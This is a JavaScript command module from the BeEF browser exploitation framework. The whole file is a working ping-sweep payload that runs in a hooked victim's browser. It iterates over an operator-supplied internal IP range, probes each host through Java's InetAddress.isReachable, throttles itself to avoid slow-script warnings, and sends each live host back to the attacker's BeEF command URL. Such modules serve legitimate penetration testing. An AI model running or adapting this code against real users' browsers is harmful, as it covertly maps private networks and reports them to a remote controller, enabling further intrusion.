//
//   Copyright 2011 Wade Alcorn wade@bindshell.net
//
//   Licensed under the Apache License, Version 2.0 (the "License");
//   you may not use this file except in compliance with the License.
//   You may obtain a copy of the License at
//
//       http://www.apache.org/licenses/LICENSE-2.0
//
//   Unless required by applicable law or agreed to in writing, software
//   distributed under the License is distributed on an "AS IS" BASIS,
//   WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
//   See the License for the specific language governing permissions and
//   limitations under the License.
//

beef.execute(function() {

    var ips = new Array();
    ipRange = "<%= @ipRange %>";
    timeout = "<%= @timeout %>";
    delay = parseInt(timeout) + parseInt("<%= @delay %>");

    // ipRange will be in the form of 192.168.0.1-192.168.0.254: the fourth octet will be iterated.
    // Note: if ipRange is just an IP address like 192.168.0.1, the ips array will contain only one element: ipBounds[0]
    // (only C class IPs are supported atm). Same code as internal_network_fingerprinting module
    ipBounds = ipRange.split('-');
    if(ipBounds.length>1) {
	lowerBound = ipBounds[0].split('.')[3];
        upperBound = ipBounds[1].split('.')[3];
	
        for(i=lowerBound;i<=upperBound;i++){
        	ipToTest = ipBounds[0].split('.')[0]+"."+ipBounds[0].split('.')[1]+"."+ipBounds[0].split('.')[2]+"."+i
            	ips.push(ipToTest);
        }
    } else {
	ipToTest = ipBounds[0]
	ips.push(ipToTest);
    }

    if(ips.length==1) verbose=true;
    else verbose=false; /* enable for debug */

    
    function do_scan(host, timeout) {

	var  status=false;
	ping="";

	try {
		status = java.net.InetAddress.getByName(host).isReachable(timeout);
	} catch(e) { /*handle exception...? */ }

	if (status) {
		ping = host + " is alive!";
	} else {
		if(verbose) {
			ping = host + " is not alive";
		}
	}
	return ping;
    }


    // call do_scan for each ip
    // use of setInterval trick to avoid slow script warnings
    i=0;
    if(ips.length>1) {
	int_id = setInterval( function() { 
		host = do_scan(ips[i++],timeout);
		if(host!="") beef.net.send('<%= @command_url %>', <%= @command_id %>, 'host='+host);
		if(i==ips.length) { clearInterval(int_id); beef.net.send('<%= @command_url %>', <%= @command_id %>, 'host=Ping sweep finished'); }
    	}, delay);
    } else {
    	host = do_scan(ips[i],timeout);
	beef.net.send('<%= @command_url %>', <%= @command_id %>, 'host='+host);
    }

});

